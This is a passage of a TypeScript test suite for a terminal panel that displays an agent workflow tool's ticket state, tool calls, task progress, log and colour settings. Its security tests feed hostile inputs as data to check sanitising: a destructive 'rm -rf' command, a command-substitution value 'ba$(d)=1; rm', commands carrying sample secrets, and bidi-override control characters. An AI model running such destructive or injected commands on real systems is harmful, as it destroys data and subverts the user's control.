    expect(h.texts(), lane).toContain(stage);
  }
});

// ---- Phase 08.8.1-05: the NOW line, the tool line, the waiting line and the reconciled roster ----

// Phase 08.8.1 L-06: the first NOW line names the task in flight (build), the review round (review) or the stage; the second names the accord agent on it with its running time.
it('risk:parsing the now line names the task in flight the review round or the stage and the agent on it (L-06)', async () => {
  const { nowLines } = await loadView();
  const t0 = 5_000_000;
  const exec = [{ key: 'a1', type: 'accord-executor', running: true, startTime: t0 - 72000 }];
  const build = { id: 'ST-1', stage: 'build', lane: 'M', tasksDone: 2, tasksTotal: 4, now: { task: 3, title: 'Settings view' } };
  expect(nowLines({ ticket: build, agents: exec, waiting: undefined, now: t0 })).toEqual([{ text: 'task 3 of 4 · Settings view' }, { text: 'executor · 1:12' }]);
  const review = { id: 'ST-1', stage: 'review', lane: 'M', tasksDone: 4, tasksTotal: 4, review: { cycle: 1, round: 2, cap: 5, rounds: [] } };
  expect(nowLines({ ticket: review, agents: exec, waiting: undefined, now: t0 })[0]).toEqual({ text: 'review round 2 of 5' });
  expect(nowLines({ ticket: { id: 'ST-1', stage: 'verify', lane: 'M', tasksDone: 4, tasksTotal: 4 }, agents: [], waiting: undefined, now: t0 })).toEqual([{ text: 'verify' }]);
  // a build ticket with no `now` key reads its stage word, and a finished agent or a non-accord agent adds no second line
  const plain = { id: 'ST-1', stage: 'build', lane: 'M', tasksDone: 1, tasksTotal: 3 };
  const idle = [
    { key: 'f1', type: 'accord-executor', running: false, startTime: 1, endTime: 2, durationMs: 1000 },
    { key: 'g1', type: 'general-purpose', running: true, startTime: 1 },
  ];
  expect(nowLines({ ticket: plain, agents: idle, waiting: undefined, now: t0 })).toEqual([{ text: 'build' }]);
  // every text is cleaned
  const dirty = { ...build, now: { task: 3, title: 'bad‮\u0007title' } };
  expect(nowLines({ ticket: dirty, agents: [], waiting: undefined, now: t0 })).toEqual([{ text: 'task 3 of 4 · bad title' }]);
});

// Phase 08.8.1 L-06: the NOW lines sit under the head and above the AGENTS block; a malformed `now` key is dropped.
it('risk:regression the ticket tab draws the now line under the head (L-06)', async () => {
  const h = await paneWith({ stage: 'build', tasksDone: 2, tasksTotal: 4, now: { task: 3, title: 'Settings view' } });
  h.agents = [agentOf('a1', 'accord-executor', { startTime: Date.now() - 62000 })];
  await h.fire('turn.start', subStart('a1'));
  const t = h.texts();
  const first = t.indexOf('task 3 of 4 · Settings view');
  const second = t.findIndex((x) => /^executor · 1:0[0-9]$/.test(x));
  expect(first).toBeGreaterThan(t.indexOf('ST-1 Login form'));
  expect(second).toBe(first + 1);
  expect(first).toBeLessThan(t.indexOf('AGENTS'));
  expect(h.cell('task 3 of 4 · Settings view').text.bold).toBe(true);
  expect(h.cell(t[second]).text.dimColor).toBe(true);
  const mod = await loadView();
  for (const now of [{ task: '3', title: 'x' }, { task: 3, title: 7 }, 'oops', null]) {
    const got = mod.detailOutcome({ exitCode: 0, stdout: JSON.stringify(detailOf({ now })), stderr: '' });
    expect(got.ticket.now, JSON.stringify(now)).toBeUndefined();
  }
  const odd = await paneWith({ stage: 'build', now: { task: '3', title: 7 } });
  expect(odd.texts().filter((x) => x === 'build 1/3')).toHaveLength(1);
  expect(odd.texts()).toContain('build');
  expect(odd.texts().some((x) => x.startsWith('task '))).toBe(false);
});

// Phase 08.8.1 D-01 L-06 T-08.8.1-14 T-08.8.1-15 (probe row P1 held): the tool line is a tool name plus a base name or a program name, never arguments; a task number comes only from the fixed report path shape of the shown ticket.
it('risk:security the tool line shows a tool name and a base name or program name and never arguments (D-01)', async () => {
  const { toolLabel, briefTask } = await loadView();
  expect(toolLabel({ tool: 'Edit', file_path: 'C:/w/packages/core/panel/view.js' })).toBe('Edit view.js');
  expect(toolLabel({ tool: 'Read', file_path: 'C:\\w\\notes.md' })).toBe('Read notes.md');
  expect(toolLabel({ tool: 'Bash', command: 'npx vitest run --project core TOKEN=abc' })).toBe('Bash vitest');
  expect(toolLabel({ tool: 'Bash', command: 'npx --yes @accord-dev/accord@0.17.0 task-done ST-1 3' })).toBe('Bash accord');
  expect(toolLabel({ tool: 'Bash', command: 'npm exec -- vitest run' })).toBe('Bash vitest');
  expect(toolLabel({ tool: 'Bash', command: 'SECRET=hunter2 TOKEN=abc git push' })).toBe('Bash git');
  expect(toolLabel({ tool: 'Bash', command: 'C:\\x\\node.exe build.js' })).toBe('Bash node');
  expect(toolLabel({ tool: 'Bash', command: '"C:\\Program Files\\nodejs\\node.exe" --token=abc' })).toBe('Bash node');
  expect(toolLabel({ tool: 'PowerShell', command: 'Get-ChildItem -Recurse' })).toBe('PowerShell Get-ChildItem');
  expect(toolLabel({ tool: 'Grep', pattern: 'secret' })).toBe('Grep');
  expect(toolLabel({ tool: 'mcp__x__y', file_path: 'a/b.txt', command: 'rm -rf' })).toBe('mcp__x__y');
  expect(toolLabel({ tool: 'Bash', command: 7 })).toBe('Bash');
  expect(toolLabel({ tool: 'Bash', command: 'ba$(d)=1; rm' })).toBe('Bash');
  expect(toolLabel({})).toBeUndefined();
  expect(toolLabel({ tool: 7 })).toBeUndefined();
  const dirty = toolLabel({ tool: 'Edit', file_path: 'C:/w/vi\u202eew\u0007.js' }) as string;
  expect(dirty).toBe('Edit vi ew .js');
  for (const ch of dirty) expect(ch.codePointAt(0)).toBeGreaterThanOrEqual(0x20);
  expect([...(toolLabel({ tool: 'Edit', file_path: 'x/' + 'a'.repeat(100) + '.js' }) as string)].length).toBeLessThanOrEqual(40);
  expect(briefTask('.accord-reports/ST-1/brief-3.md', 'ST-1')).toBe(3);
  expect(briefTask('C:/w/.accord-reports/ST-1/task-2.md', 'ST-1')).toBe(2);
  expect(briefTask('C:\\w\\.accord-reports\\ST-1\\task-12.md', 'ST-1')).toBe(12);
  for (const path of ['.accord-reports/ST-2/brief-3.md', 'x.accord-reports/ST-1/brief-3.md', '.accord-reports/ST-1/brief-0.md', '.accord-reports/ST-1/brief-3.md.bak', '.accord-reports/ST-1/other-3.md', '.accord-reports/ST-1/sub/brief-3.md', 7, undefined]) {
    expect(briefTask(path, 'ST-1'), String(path)).toBeUndefined();
  }
  expect(briefTask('.accord-reports/a b/brief-3.md', 'a b')).toBeUndefined();
  expect(briefTask('.accord-reports/AxB/brief-3.md', 'A.B')).toBeUndefined();
});

// Phase 08.8.1 D-01 L-06 L-05 T-08.8.1-07 (probe rows P1 and P2 held): a subagent tool call sets its row's tool and task, a main-loop accord command schedules one refresh after it ran, and the hook never changes a call.
it("risk:complex-branching a subagent tool call sets its row's tool and task and a main-loop accord command refreshes show after it ran (D-01 L-06 L-05)", async () => {
  const h = await claimedPane();
  h.agents = [agentOf('a1', 'accord-executor', { startTime: Date.now() - 62000 })];
  await h.fire('turn.start', subStart('a1'));
  const read = { tool: 'Read', file_path: '.accord-reports/ST-1/brief-3.md', agentId: 'a1' };
  expect(await h.fire('tool.call', read)).toBe(read);
  await vi.waitFor(() => expect(h.texts()).toContain('task 3'));
  const edit = { tool: 'Edit', file_path: 'src/view.js', agentId: 'a1', old_string: 'secret one', new_string: 'secret two' };
  await h.fire('tool.call', edit);
  await vi.waitFor(() => expect(h.texts().some((x) => /^executor · 1:0[0-9] · Edit view\.js$/.test(x))).toBe(true));
  expect(h.texts().join('\n')).not.toContain('secret');
  expect(edit).toEqual({ tool: 'Edit', file_path: 'src/view.js', agentId: 'a1', old_string: 'secret one', new_string: 'secret two' });
  // a call of another ticket's report, and a call of an agent the roster does not hold, change nothing
  await h.fire('tool.call', { tool: 'Read', file_path: '.accord-reports/ST-9/brief-7.md', agentId: 'a1' });
  await h.fire('tool.call', { tool: 'Read', file_path: '.accord-reports/ST-1/brief-8.md', agentId: 'zz' });
  await new Promise((r) => setTimeout(r, 10));
  expect(h.texts()).not.toContain('task 7');
  expect(h.texts()).not.toContain('task 8');
  // a main-loop accord command schedules one debounced show refresh after the call ran; another command schedules none
  expect(h.$.clock.after).not.toHaveBeenCalled();
  let ran = false;
  const result = await h.fire('tool.call', { tool: 'Bash', command: 'npx --yes @accord-dev/accord@0.17.0 task-done ST-1 3' }, async () => {
    expect(h.$.clock.after).not.toHaveBeenCalled();
    ran = true;
    return 'RESULT';
  });
  expect(result).toBe('RESULT');
  expect(ran).toBe(true);
  expect(h.$.clock.after).toHaveBeenCalledTimes(1);
  expect(h.$.clock.after).toHaveBeenLastCalledWith(3000, expect.any(Function));
  await h.fire('tool.call', { tool: 'Bash', command: 'git status' });
  await h.fire('tool.call', { tool: 'Read', file_path: 'accord/config.yml' });
  expect(h.$.clock.after).toHaveBeenCalledTimes(1);
  const base = h.$.process.run.mock.calls.length;
  await h.timers.filter((t) => t.ms === 3000 && !t.cancelled).at(-1)?.fn();
  expect(h.$.process.run.mock.calls.length).toBe(base + 1);
  expect(h.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-1'), { timeoutMs: 120000 });
  // a hook whose roster write throws still returns what the call returned
  const bad = {
    tool: 'Read',
    agentId: 'a1',
    get file_path(): string {
      throw new Error('boom');
    },
  };
  expect(await h.fire('tool.call', bad, async () => 'STILL')).toBe('STILL');
  // a session that never opened the pane records nothing and still passes the call on
  const cold = await host(await loadPanel());
  expect(await cold.fire('tool.call', { tool: 'Bash', command: 'accord gate ready ST-1' }, async () => 'COLD')).toBe('COLD');
  expect(cold.$.clock.after).not.toHaveBeenCalled();
});

// Phase 08.8.1 L-06 (probe row P8 held): after a main-loop turn ends the NOW line reads waiting for you with the turn's last answer line; an open AskUserQuestion call reads the same; the next main-loop turn clears it.
it('risk:complex-branching the now line says waiting for you after a main turn ends and clears when the next turn starts (L-06)', async () => {
  const h = await claimedPane();
  h.agents = [agentOf('a1', 'accord-executor')];
  await h.fire('turn.start', subStart('a1'));
  await h.fire('turn.complete', { agentId: 'a1', answer: 'sub answer', durationMs: 10, reason: 'answer' });
  expect(h.texts().some((x) => x.startsWith('Waiting for you'))).toBe(false);
  await h.fire('turn.complete', { answer: 'Done.\nKeep it? Answer in the chat.\n\n', reason: 'answer' });
  await vi.waitFor(() => expect(h.texts()).toContain('Waiting for you · 0:00'));
  const t = h.texts();
  expect(t[t.indexOf('Waiting for you · 0:00') + 1]).toBe('Keep it? Answer in the chat.');
  expect(h.cell('Waiting for you · 0:00').text.bold).toBe(true);
  await h.fire('turn.start', { turnId: 'next', text: 'yes' });
  await vi.waitFor(() => expect(h.texts().some((x) => x.startsWith('Waiting for you'))).toBe(false));
  // an answer line is cleaned; an answer that is not a string adds no second line
  await h.fire('turn.complete', { answer: 'ok\u202e\u0007bad', reason: 'answer' });
  await vi.waitFor(() => expect(h.texts()).toContain('ok bad'));
  await h.fire('turn.start', { turnId: 'n2', text: 'x' });
  await h.fire('turn.complete', { answer: 42, reason: 'answer' });
  await vi.waitFor(() => expect(h.texts()).toContain('Waiting for you · 0:00'));
  const u = h.texts();
  expect(u[u.indexOf('Waiting for you · 0:00') + 1]).not.toBe('42');
  await h.fire('turn.start', { turnId: 'n3', text: 'x' });
  // an open AskUserQuestion call reads waiting while it is pending and clears when it returns
  let release: (v: string) => void = () => undefined;
  const pending = h.fire('tool.call', { tool: 'AskUserQuestion' }, () => new Promise<string>((res) => (release = res)));
  await vi.waitFor(() => expect(h.texts()).toContain('Waiting for you · 0:00'));
  release('ANSWER');
  expect(await pending).toBe('ANSWER');
  await vi.waitFor(() => expect(h.texts().some((x) => x.startsWith('Waiting for you'))).toBe(false));
});

// Phase 08.8.1 W5 (08.7 review WR-05): the roster is reconciled with the host's agent list at each main-loop turn end and refresh, and a change of ticket clears it.
it('risk:concurrency an agent the host no longer lists as running is marked finished at the next main turn end and its timer stops (W5)', async () => {
  // Phase 08.8.1-09: this person has motion off, so the waiting line after the main turn end blinks nothing and no timer outlives the agents (the blink is in the resource case of 08.8.1-09)
  const h = await paneWith({}, (x) => void x.store.set('settings', { v: 1, motion: 'off', effects: {} }));
  h.agents = [agentOf('a1', 'accord-executor'), agentOf('a2', 'accord-planner')];
  await h.fire('turn.start', subStart('a1'));
  await h.fire('turn.start', subStart('a2'));
  expect(isRunning(h, 'executor')).toBe(true);
  expect(isRunning(h, 'planner')).toBe(true);
  const ticks = everyTimers(h);
  expect(ticks).toHaveLength(1);
  expect(ticks[0].cancelled).toBe(false);
  // a1 is gone from the list and a2 is listed with another status; neither raised its own turn.complete
  h.agents = [agentOf('a2', 'accord-planner', { status: 'completed' })];
  await h.fire('turn.complete', { reason: 'answer' });
  await vi.waitFor(() => expect(h.texts()).toContain('✓ executor'));
  expect(h.texts()).toContain('✓ planner');
  expect(isRunning(h, 'executor')).toBe(false);
  expect(ticks.every((t) => t.cancelled)).toBe(true);
  expect(everyTimers(h).filter((t) => !t.cancelled)).toHaveLength(0);
  expect(tabs(h)['tab:ticket'].label).not.toContain('◐');
  // a change of the dashboard's current id clears the roster
  h.settle({ stdout: JSON.stringify(board({ current: 'ST-2', yours: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 } })) });
  await vi.waitFor(() => expect(h.$.process.run).toHaveBeenLastCalledWith(SHOW('ST-2'), { timeoutMs: 120000 }));
  h.settle({ stdout: JSON.stringify(detailOf({ id: 'ST-2', title: 'Export' })) });
  await vi.waitFor(() => expect(h.texts()).toContain('ST-2 Export'));
  expect(h.texts()).toContain('none running');
  expect(h.texts()).not.toContain('✓ executor');
});

// Phase 08.8.1 IN-01 (08.7 review): a throw inside an awaited call never stops the hook chain, and a pane that failed to open is opened by the next start.
it('risk:regression a throwing hook still passes the event on and a failed pane open allows a retry (IN-01)', async () => {
  const lister = await host(await loadPanel());
  lister.$.agent.list.mockRejectedValue(new Error('no list'));
  expect(await lister.fire('session.start', start, async () => 'S')).toBe('S');
  expect(await lister.fire('turn.start', subStart('a1'), async () => 'T')).toBe('T');
  const drawn = await claimedPane();
  drawn.agents = [agentOf('a1', 'accord-executor')];
  drawn.$.ui.invalidate.mockRejectedValue(new Error('draw'));
  expect(await drawn.fire('turn.start', subStart('a1'), async () => 'T')).toBe('T');
  expect(await drawn.fire('turn.complete', { agentId: 'a1', durationMs: 5, reason: 'answer' }, async () => 'C')).toBe('C');
  expect(await drawn.fire('turn.complete', { reason: 'answer' }, async () => 'M')).toBe('M');
  const opener = await host(await loadPanel());
  opener.$.ui.open.mockRejectedValueOnce(new Error('open'));
  expect(await opener.fire('session.start', start, async () => 'S')).toBe('S');
  expect(opener.$.ui.open).toHaveBeenCalledTimes(1);
  await opener.fire('session.start', start);
  expect(opener.$.ui.open).toHaveBeenCalledTimes(2);
  const attacher = await host(await loadPanel());
  attacher.$.ui.open.mockRejectedValueOnce(new Error('open'));
  expect(await attacher.fire('session.attach', { surface: 'desktop', clientId: 'desktop:default' }, async () => 'A')).toBe('A');
  await attacher.fire('session.attach', { surface: 'desktop', clientId: 'desktop:default' });
  expect(attacher.$.ui.open).toHaveBeenCalledTimes(2);
});

// Phase 08.8.1 IN-03 (08.7 review): one loader runs show; a main-loop turn end starts the ticket's show only when the dashboard run left the id unchanged, so a new id costs one show.
it('risk:concurrency a new ticket id starts one show run and not two (IN-03)', async () => {
  const showsOf = (h: Awaited<ReturnType<typeof host>>, id: string): number => h.$.process.run.mock.calls.filter((c: any[]) => c[0][3] === 'show' && c[0][4] === id).length;
  const h = await claimedPane();
  expect(showsOf(h, 'ST-1')).toBe(1);
  await h.fire('turn.complete', { reason: 'answer' });
  h.settle({ stdout: JSON.stringify(board({ current: 'ST-2', yours: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 } })) });
  await vi.waitFor(() => expect(showsOf(h, 'ST-2')).toBe(1));
  await new Promise((r) => setTimeout(r, 20));
  expect(showsOf(h, 'ST-1')).toBe(1);
  expect(showsOf(h, 'ST-2')).toBe(1);
  h.settle({ stdout: JSON.stringify(detailOf({ id: 'ST-2', title: 'Export' })) });
  await vi.waitFor(() => expect(h.inflight()).toBe(0));
  expect(showsOf(h, 'ST-2')).toBe(1);
  // the same id: the dashboard run settles first and then the ticket's show runs once
  await h.fire('turn.complete', { reason: 'answer' });
  h.settle({ stdout: JSON.stringify(board({ current: 'ST-2', yours: { rows: [{ id: 'ST-2', title: 'Export' }], more: 0 } })) });
  await vi.waitFor(() => expect(showsOf(h, 'ST-2')).toBe(2));
  h.settle({ stdout: JSON.stringify(detailOf({ id: 'ST-2', title: 'Export' })) });
  await vi.waitFor(() => expect(h.inflight()).toBe(0));
  expect(showsOf(h, 'ST-2')).toBe(2);
});

// ---- Phase 08.8.1-06 L-07: the task list with a build progress bar in the ticket tab's lower half ----

const taskOf = (n: number, title: string, done = false, covers: string[] = []): Record<string, unknown> => ({ n, title, done, covers });

// Phase 08.8.1 L-07: one row per task with a mark, the task in flight is current, and the bar reads the json's own counts.
it('risk:parsing task rows mark done the task in flight and the rest and the bar reads the json counts (L-07)', async () => {
  const { taskRows, buildProgress } = await loadView();
  const rows = taskRows([taskOf(1, 'A', true), taskOf(2, 'B', false, ['ac-1']), taskOf(3, 'Ev\u202eil\u0007 C')], 2);
  expect(rows.map((r: any) => [r.mark, r.state, r.n, r.title])).toEqual([['✓', 'done', 1, 'A'], ['▸', 'current', 2, 'B'], ['·', 'todo', 3, 'Ev il C']]);
  // a done task stays done even when `now` names it; no current task leaves only done and todo
  expect(taskRows([taskOf(1, 'A', true)], 1)[0].state).toBe('done');
  expect(taskRows([taskOf(1, 'A')], undefined)[0].state).toBe('todo');
  expect(buildProgress({ tasksDone: 1, tasksTotal: 3 })).toEqual({ value: 1, max: 3, valueText: '1 of 3' });
  expect(buildProgress({ tasksDone: 0, tasksTotal: 0 })).toBeUndefined();
  expect(buildProgress({ tasksDone: '1', tasksTotal: 3 })).toBeUndefined();
  expect(buildProgress({ tasksTotal: 3 })).toBeUndefined();
});

// Phase 08.8.1 L-07: the TASKS block sits after the NOW line and before REVIEW; an engine without Progress draws the count as text; a ticket without `tasks` draws no block.
it('risk:regression the ticket tab draws a tasks block with a progress bar between the now line and review (L-07)', async () => {
  const tasks = [taskOf(1, 'Alpha', true), taskOf(2, 'Beta'), taskOf(3, 'Gamma')];
  const over = { stage: 'build', tasksDone: 1, tasksTotal: 3, now: { task: 2, title: 'Beta' }, tasks, review: reviewOf(), criteria: [critOf('ac-1', 'Logs in', 'passing')] };
  const h = await paneWith(over);
  const t = h.texts();
  const now = t.indexOf('task 2 of 3 · Beta');
  expect(now).toBeGreaterThan(-1);
  expect(t.indexOf('TASKS')).toBeGreaterThan(now);
  expect(t.indexOf('TASKS')).toBeLessThan(t.findIndex((x) => x.startsWith('REVIEW')));
  expect(kids(h.row('Alpha'))).toEqual(['✓', '1', 'Alpha']);
  expect(kids(h.row('Beta'))).toEqual(['▸', '2', 'Beta']);
  expect(kids(h.row('Gamma'))).toEqual(['·', '3', 'Gamma']);
  // Phase 08.8.1-07 L-01: the done tick takes the person's tick colour, aurora's by default
  expect(h.cell('✓').text.color).toBe('#6fd39a');
  expect(h.cell('▸').text.bold).toBe(true);
  const bars = h.nodes('Progress');
  expect(bars).toHaveLength(1);
  expect(bars[0].props).toMatchObject({ value: 1, max: 3, valueText: '1 of 3' });
  const plain = await paneWith(over, (x) => {
    const full = x.$.ui.resolve;
    x.$.ui.resolve = () => {
      const rest = { ...full() };
      delete rest.Progress;
      return rest;
    };
  });
  expect(plain.nodes('Progress')).toHaveLength(0);
  expect(plain.texts()).toContain('1 of 3');
  const none = await paneWith({ stage: 'build', now: { task: 2, title: 'Beta' } });
  expect(none.texts()).not.toContain('TASKS');
  expect(none.nodes('Progress')).toHaveLength(0);
});

// Phase 08.8.1 D-05 L-07: a ticket whose records git does not hold draws its warning and no TASKS block, no bar, no count and no task row.
it('risk:complex-branching a not-committed ticket draws no tasks block no bar and no task row (D-05 L-07)', async () => {
  const tasks = [taskOf(1, 'A'), taskOf(2, 'B'), taskOf(3, 'C')];
  const warned = { stage: 'build', tasksDone: 0, tasksTotal: 3, now: { task: 1, title: 'A' }, tasks, warnings: [{ kind: 'not-committed', text: 'accord/ is not committed here' }] };
  const h = await paneWith(warned);
  const t = h.texts();
  expect(t).toContain('accord/ is not committed here');
  expect(t).not.toContain('TASKS');
  expect(h.nodes('Progress')).toHaveLength(0);
  for (const x of t) {
    expect(x).not.toContain('0 of 3');
    expect(x).not.toContain('0/3');
    expect(['A', 'B', 'C']).not.toContain(x);
  }
  const { detailOutcome, ticketView } = await loadView();
  const shownOf = (json: Record<string, unknown>) => ticketView({ ticket: { id: 'ST-1', state: detailOutcome({ exitCode: 0, stdout: JSON.stringify(detailOf(json)), stderr: '' }) }, now: 1000 });
  const w = shownOf(warned);
  expect(Object.hasOwn(w, 'tasks')).toBe(false);
  expect(Object.hasOwn(w, 'progress')).toBe(false);
  const tracked = { ...warned, warnings: undefined };
  const ok = shownOf(tracked);
  expect(ok.tasks).toHaveLength(3);
  expect(ok.progress).toEqual({ value: 0, max: 3, valueText: '0 of 3' });
  const clean = await paneWith(tracked);
  expect(clean.texts()).toContain('TASKS');
  expect(clean.nodes('Progress')).toHaveLength(1);
});

// ---- Phase 08.8.1-06 L-07: the log merges repeats and fills the room, criteria labels follow their titles ----

// Phase 08.8.1 L-07: CSA-185's interleaved repeats read as one line each with a count; the newest row is marked; the room sizes the cut.
it('risk:parsing repeated log lines merge into the newest with a count and the newest is marked (L-07)', async () => {
  const { mergeLog, logRows, LOG_SHOWN } = await loadView();
  const now = 3000;
  const log = [
    { at: now - 660, kind: 'gate', text: 'gate plan PASS' },
    { at: now - 670, kind: 'gate', text: 'gate ready PASS' },
    { at: now - 1080, kind: 'gate', text: 'gate plan PASS' },
    { at: now - 1090, kind: 'gate', text: 'gate ready PASS' },
    { at: now - 1200, kind: 'report', text: 'executor report task 2' },
  ];
  const merged = mergeLog(log);
  expect(merged.map((e: any) => [e.text, e.count, e.at])).toEqual([['gate plan PASS', 2, now - 660], ['gate ready PASS', 2, now - 670], ['executor report task 2', 1, now - 1200]]);
  const rows = logRows(log, now);
  expect(rows).toEqual([
    { age: '11m', text: 'gate plan PASS', fail: false, count: 2, newest: true },
    { age: '11m', text: 'gate ready PASS', fail: false, count: 2 },
    { age: '20m', text: 'executor report task 2', fail: false },
  ]);
  // the same text under another kind is another line; a failed run keeps its mark
  const kinds = logRows([{ at: 10, kind: 'gate', text: 'x', fail: true }, { at: 9, kind: 'commit', text: 'x' }], 20);
  expect(kinds).toEqual([{ age: '10s', text: 'x', fail: true, newest: true }, { age: '11s', text: 'x', fail: false }]);
  const many = Array.from({ length: 60 }, (_, i) => ({ at: 1000 - i, kind: 'commit', text: `c${i}` }));
  expect(logRows(many.slice(0, 30), 1010, 20)).toHaveLength(20);
  expect(logRows(many.slice(0, 30), 1010, 3)).toHaveLength(LOG_SHOWN);
  expect(logRows(many.slice(0, 30), 1010)).toHaveLength(LOG_SHOWN);
  expect(logRows(many, 1010, 500)).toHaveLength(50);
  for (const room of ['x', NaN, Infinity, -4, null]) expect(logRows(many, 1010, room), String(room)).toHaveLength(LOG_SHOWN);
  expect(logRows([], 1010, 20)).toEqual([]);
});

// Phase 08.8.1 L-07: criteria labels sit right after their titles, the newest log line is bold and undimmed, and the log takes the rows the pane has left.
it('risk:regression criteria labels sit next to their titles and the newest log line is bold (L-07)', async () => {
  const now = Math.floor(Date.now() / 1000);
  const log = Array.from({ length: 30 }, (_, i) => ({ at: now - 30 - i * 40, kind: 'commit', text: `commit number ${i}` }));
  const h = await paneWith({ stage: 'review', review: reviewOf(), criteria: [critOf('ac-1', 'Logs in', 'passing')], log }, (x) => void (x.rows = 40));
  expect(h.cell('Logs in').box.flexGrow).toBeUndefined();
  expect(kids(h.row('Logs in'))).toEqual(['ac-1', 'Logs in', 'passing']);
  expect(h.cell('commit number 0').text.bold).toBe(true);
  expect(h.cell('commit number 0').text.dimColor).toBeUndefined();
  expect(h.cell('commit number 1').text.bold).toBeUndefined();
  const t = h.texts();
  const rows = (t.length - t.indexOf('LOG') - 1) / 2;
  expect(rows).toBeGreaterThan(8);
  expect(rows).toBeLessThanOrEqual(30);
  // a short pane keeps the eight lines, and no rows reported keeps them too
  const short = await paneWith({ stage: 'review', review: reviewOf(), criteria: [critOf('ac-1', 'Logs in', 'passing')], log }, (x) => void (x.rows = 10));
  expect(short.texts().length - short.texts().indexOf('LOG') - 1).toBe(16);
  const unknown = await paneWith({ log });
  expect(unknown.texts().length - unknown.texts().indexOf('LOG') - 1).toBe(16);
  // repeated lines draw once with their count
  const twice = await paneWith({ log: [{ at: now - 5, kind: 'gate', text: 'gate plan PASS' }, { at: now - 9, kind: 'commit', text: 'c' }, { at: now - 60, kind: 'gate', text: 'gate plan PASS' }] });
  expect(twice.texts().filter((x) => x.startsWith('gate plan PASS'))).toEqual(['gate plan PASS ×2']);
});

// ---- Phase 08.8.1-07 L-03 L-02 L-01: each person's settings, kept in the mod's own store and never in the repository ----

// Phase 08.8.1 L-03: a stored settings value that is missing, from another version or hand-edited into anything invalid reads as the defaults field by field.
it('risk:parsing stored settings read as the defaults field by field when missing or invalid (L-03)', async () => {
  const { settingsOf, DEFAULT_SETTINGS } = await loadView();
  const d = DEFAULT_SETTINGS;
  expect(settingsOf(undefined)).toEqual(d);
  expect(d).toMatchObject({ v: 1, palette: 'aurora', style: 'gradient', motion: 'lively', places: {} });
  expect(d.effects).toEqual({ shimmer: true, flow: true, comet: true, eq: true, typing: true, confetti: true, roll: true, breathe: true });
  expect(settingsOf({ v: 1, palette: 'ember', style: 'solid', motion: 'calm' })).toMatchObject({ palette: 'ember', style: 'solid', motion: 'calm', effects: { shimmer: true, roll: true } });
  expect(settingsOf({ v: 1, palette: 'neon', style: 'solid' })).toMatchObject({ palette: 'aurora', style: 'solid' });
  expect(settingsOf({ v: 1, palette: 'ember', style: 'x' })).toMatchObject({ palette: 'ember', style: 'gradient' });
  expect(settingsOf({ v: 1, motion: 'frantic' })).toMatchObject({ motion: 'lively' });
  expect(settingsOf({ v: 1, places: { title: 'blue', agents: '#3EC6E0', nowhere: '#ffffff' } }).places).toEqual({ agents: '#3ec6e0' });
  expect(settingsOf({ v: 1, custom: ['#12345', '#00ff00', 5] }).custom).toEqual([d.custom[0], '#00ff00', d.custom[2]]);
  for (const bad of [{ v: 2, palette: 'ember' }, [], 'ember', 7, null, true]) expect(settingsOf(bad)).toEqual(d);
  // the defaults are never shared: a read value changes nothing of them
  settingsOf(undefined).places.title = '#ffffff';
  expect(settingsOf(undefined).places).toEqual({});
});

// the colour of each character of the title (the ticket head's first Text), as drawn
const titleColors = (h: Awaited<ReturnType<typeof host>>): string[] => h.cell('ST-1 Login form').text.children.map((c: any) => c.props.color);

// Phase 08.8.1 L-03 L-02: key s opens the view, Save keeps the choice in the person's store, and a new session draws the title in it; a session with an empty store is aurora.
it('risk:regression the settings key opens the view and a saved preset colours the title in a new session (L-03 L-02)', async () => {
  const first = await paneWith({});
  expect(titleColors(first)[0]).toBe('#e07a4f');
  const button = first.buttons().find((b) => b.key === 'settings') as Record<string, any>;
  expect(button).toMatchObject({ hotkey: 's' });
  expect(button.autoFocus).toBeUndefined();
  press(first, 'settings');
  await vi.waitFor(() => expect(first.buttons().filter((b) => String(b.key).startsWith('palette:')).map((b) => b.label)).toEqual(['aurora', 'ember', 'ocean', 'forest', 'sunset', 'mono', 'contrast', 'custom']));
  press(first, 'palette:ember');
  await vi.waitFor(() => expect(first.buttons().find((b) => b.key === 'palette:ember')?.variant).toBe('primary'));
  expect(first.$.store.set).not.toHaveBeenCalled();
  press(first, 'save');
  await vi.waitFor(() => expect(first.$.store.set).toHaveBeenCalledWith('settings', expect.objectContaining({ v: 1, palette: 'ember' })));
  expect(first.$.ui.toast).toHaveBeenCalledWith('saved for you only');
  const saved = first.store.get('settings');
  const again = await paneWith({}, (x) => void x.store.set('settings', saved));
  expect(titleColors(again)[0]).toBe('#ff7a45');
  const fresh = await paneWith({});
  expect(titleColors(fresh)[0]).toBe('#e07a4f');
  expect(fresh.$.store.set).not.toHaveBeenCalled();
  // a store that throws is the defaults
  const broken = await paneWith({}, (x) => void x.$.store.get.mockRejectedValue(new Error('no store')));
  expect(titleColors(broken)[0]).toBe('#e07a4f');
});

// ---- Phase 08.8.1-07 task 2: the whole settings view ----

const inputOf = (h: Awaited<ReturnType<typeof host>>, key: string): Record<string, any> => h.nodes('Input').find((n) => n.props.key === key)?.props as Record<string, any>;
const flush = (): Promise<void> => new Promise((r) => setTimeout(r, 5));
const buttonOf = (h: Awaited<ReturnType<typeof host>>, key: string): Record<string, any> => h.buttons().find((b) => b.key === key) as Record<string, any>;
// the pane of a claimed ticket with the settings view open
async function settingsPane(): Promise<Awaited<ReturnType<typeof host>>> {
  const h = await paneWith({});
  press(h, 'settings');
  await vi.waitFor(() => expect(inputOf(h, 'place:title')).toBeDefined());
  return h;
}
const savedOf = async (h: Awaited<ReturnType<typeof host>>): Promise<Record<string, any>> => {
  press(h, 'save');
  await flush();
  return h.store.get('settings') as Record<string, any>;
};
const REFUSAL = 'a colour is #rrggbb, e.g. #e07a4f';

// Phase 08.8.1 L-02 (T-08.8.1-21, T-08.8.1-22): a colour that is not #rrggbb is refused and the old value kept; a failure or waiting colour under 3:1 is refused and that place reset to auto, so the store never holds a faint colour.
it('risk:security a colour that is not rrggbb is refused and a faint failure or waiting colour is refused (L-02)', async () => {
  const { contrastOk, setPlace, setCustom, settingsOf, FIXED, BACKGROUND } = await loadView();
  expect(contrastOk('#0c0d11', '#0b0c10')).toBe(false);
  expect(contrastOk('#ff5f6d', '#0b0c10')).toBe(true);
  expect(contrastOk('blue', '#0b0c10')).toBe(false);
  for (const preset of Object.values(FIXED) as Record<string, string>[]) for (const c of Object.values(preset)) expect(contrastOk(c, BACKGROUND), c).toBe(true);
  const base = settingsOf(undefined);
